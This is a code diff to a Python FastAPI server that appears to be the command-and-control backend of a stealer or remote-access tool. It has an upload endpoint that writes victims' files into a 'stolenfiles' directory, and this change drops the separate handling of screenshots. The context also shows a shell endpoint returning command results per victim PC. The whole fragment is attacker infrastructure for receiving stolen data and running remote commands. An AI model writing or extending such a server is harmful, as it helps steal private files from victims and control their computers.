@@ -9,7 +9,8 @@ from tkinter import colorchooser
 from pygments import highlight
 from pygments.lexers import get_lexer_by_name
 from pygments.formatters import HtmlFormatter
-
+import datetime
+ 
 def input_dialog(title, message):
     def ok():
         dialog_window.destroy()
@@ -143,19 +144,11 @@ async def recivePaylaod(File_param:UploadFile):
         os.mkdir(os.getcwd()+"/stolenfiles")
     except:
         pass
-    if '.png' not in File_param.filename:
-        with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
-            contents = await File_param.read()
-            f.write(contents)
-    else:
-        try:
-            os.mkdir(os.getcwd()+"/screenshots")
-        except:
-            pass
-        with open(f"{os.getcwd()}/screenshots/{File_param.filename}",'wb') as f:
-            contents = await File_param.read()
-            f.write(contents)
-    
+    with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
+        contents = await File_param.read()
+        f.write(contents)
+
+
 
 @app.post("/api/recive/text",status_code=200)
 def reciveText(text:TextPayload):
@@ -191,11 +184,13 @@ def shell(pcname:str):
     print(res)
     return {"CMD":str(res)}
 
+"""
+ISNT DONE YET
 
-import datetime
 @app.post("/api/upload/image")
 async def upload_image(file: UploadFile = File(...)):
     contents = await file.read()
     image = Image.open(io.BytesIO(contents))
     image.save(f"{file.filename}")
     return {"filename": file.filename}
+"""
